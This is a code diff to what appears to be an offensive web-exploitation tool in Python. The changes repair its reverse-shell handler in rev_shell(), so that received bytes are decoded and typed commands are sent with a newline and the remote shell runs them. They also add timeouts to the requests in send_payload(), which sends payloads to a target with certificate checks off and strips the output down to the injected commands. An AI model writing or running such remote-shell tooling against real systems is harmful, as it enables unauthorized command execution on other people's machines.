@@ -142,11 +142,14 @@ def rev_shell(addr, port):
           state.revshell_running = False
           return
         else:
-          sys.stdout.write(data)
+          ## recv returns bytes; stdout wants str
+          sys.stdout.write(data.decode('utf-8', 'replace'))
           sys.stdout.flush()
       else:
         msg = input()
-        conn.send(msg)
+        ## re-add the newline input() strips so the remote shell runs the
+        ## line, and send bytes rather than str
+        conn.send((msg + "\n").encode('utf-8'))
 
   ## cleanup
   conn.close()
@@ -769,7 +772,8 @@ def send_payload():
             verify=False,
             # cookies=cookie_data,
             headers=header_data,
-            auth=cfg.auth)
+            auth=cfg.auth,
+            timeout=cfg.timeout)
       elif cfg.method == "form":
         files = {'': (None, '')}
         ## do we have files to upload?
@@ -797,14 +801,16 @@ def send_payload():
             verify=False,
             cookies=cookie_data,
             headers=header_data,
-            auth=cfg.auth)
+            auth=cfg.auth,
+            timeout=cfg.timeout)
       else:
         r = state.requests.get(
             query,
             verify=False,
             cookies=cookie_data,
             headers=header_data,
-            auth=cfg.auth)
+            auth=cfg.auth,
+            timeout=cfg.timeout)
       ## sanitize the output. we only want to see our commands if possible
       output = ""
       if cfg.marker:
